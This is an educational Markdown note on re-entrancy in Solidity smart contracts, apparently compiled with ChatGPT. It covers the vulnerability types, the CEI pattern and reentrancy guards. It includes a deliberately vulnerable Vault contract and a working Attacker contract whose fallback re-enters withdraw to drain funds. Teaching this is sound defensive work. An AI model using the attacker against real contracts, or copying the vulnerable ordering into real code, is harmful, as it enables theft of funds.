## Re‑entrancy in Smart Contracts

### What is Re‑entrancy

- A vulnerability where a contract that makes an external call to another contract/EOA can be reentered, before its state is fully updated.  [oai_citation:0‡QuickNode](https://www.quicknode.com/guides/ethereum-development/smart-contracts/a-broad-overview-of-reentrancy-attacks-in-solidity-contracts?utm_source=chatgpt.com)
- If contracts update state **after** external calls, attacker can exploit by calling back into the vulnerable function (or other functions sharing state) from the external contract.  [oai_citation:1‡docs.soliditylang.org](https://docs.soliditylang.org/en/latest/security-considerations.html?utm_source=chatgpt.com)

---

### Types of Re‑entrancy

| Type | Description |
|---|-------------|
| Single‑function reentrancy | A function calls external code and is reentered before finishing its own state updates.  [oai_citation:2‡Cyfrin](https://www.cyfrin.io/blog/what-is-a-reentrancy-attack-solidity-smart-contracts?utm_source=chatgpt.com) |
| Cross‑function reentrancy | One function's external call leads to reentry into another function sharing mutable state.  [oai_citation:3‡Cyfrin](https://www.cyfrin.io/blog/what-is-a-reentrancy-attack-solidity-smart-contracts?utm_source=chatgpt.com) |
| Cross‑contract reentrancy | Multiple contracts interacting: an external contract is called, and that contract calls back into original.  [oai_citation:4‡QuickNode](https://www.quicknode.com/guides/ethereum-development/smart-contracts/a-broad-overview-of-reentrancy-attacks-in-solidity-contracts?utm_source=chatgpt.com) |

---

### Why It’s Dangerous

- Funds can be drained by repeated withdrawal before the state is updated.  [oai_citation:5‡QuickNode](https://www.quicknode.com/guides/ethereum-development/smart-contracts/a-broad-overview-of-reentrancy-attacks-in-solidity-contracts?utm_source=chatgpt.com)
- Unexpected state behavior, loss of invariants.  [oai_citation:6‡Cyfrin](https://www.cyfrin.io/blog/what-is-a-reentrancy-attack-solidity-smart-contracts?utm_source=chatgpt.com)
- Exploits often result in large financial losses. (e.g. The DAO)  [oai_citation:7‡QuickNode](https://www.quicknode.com/guides/ethereum-development/smart-contracts/a-broad-overview-of-reentrancy-attacks-in-solidity-contracts?utm_source=chatgpt.com)

---

### Common Prevention Techniques

1. **Checks‑Effects‑Interactions (CEI) Pattern**
    - Do all `require` / validate inputs first.
    - Update state variables **before** any external calls.
    - Then do external calls.  [oai_citation:8‡docs.soliditylang.org](https://docs.soliditylang.org/en/latest/security-considerations.html?utm_source=chatgpt.com)

2. **Reentrancy Guard / Mutex**
    - Use a lock boolean or OpenZeppelin’s `ReentrancyGuard` / `nonReentrant` modifier. Prevents nested calls.  [oai_citation:9‡Educative](https://www.educative.io/answers/how-to-protect-against-a-reentrancy-attack-in-solidity?utm_source=chatgpt.com)

3. **Limit external calls and follow minimal interfaces**
    - Be cautious calling external contracts. Fallbacks / receive functions may reenter.  [oai_citation:10‡Cyfrin](https://www.cyfrin.io/blog/what-is-a-reentrancy-attack-solidity-smart-contracts?utm_source=chatgpt.com)

4. **Testing & Auditing**
    - Use tests with malicious contracts (simulated attacker) to try reentry.
    - Audits help catch incorrect ordering or missing guards.  [oai_citation:11‡hacken.io](https://hacken.io/discover/reentrancy-attacks/?utm_source=chatgpt.com)

---

### Example (Vulnerable vs Fixed)

```solidity
// Vulnerable
function withdraw(uint amount) external {
    require(balances[msg.sender] >= amount);
    // External call first → dangerous
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success);
    // State updated after external call → reentrancy risk
    balances[msg.sender] -= amount;
}

// Fixed
function withdraw(uint amount) external {
    require(balances[msg.sender] >= amount);
    balances[msg.sender] -= amount;              // Effects first
    (bool success, ) = msg.sender.call{value: amount}("");  // Interactions last
    require(success);
}
```



## Examples of Re‑entrancy Types

Here are code sketches for each type, showing how they can be implemented and exploited.

---

### 1. Single‑Function Re‑entrancy
One function is vulnerable: it makes an external call *before* updating its own state, allowing reentry into the same function.

```solidity
// SPDX‑License‑Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint amount = balances[msg.sender];
        // External call first → vulnerable to reentrancy
        (bool success, ) = msg.sender.call{ value: amount }("");
        require(success, "Failed to send");
        // State update happens after external call → risk
        balances[msg.sender] = 0;
    }
}

contract Attacker {
    Vault public vault;

    constructor(address _vault) {
        vault = Vault(_vault);
    }

    // Fallback is triggered during external call
    fallback() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }

    function attack() external payable {
        vault.deposit{ value: msg.value }();
        vault.withdraw();
    }
}
```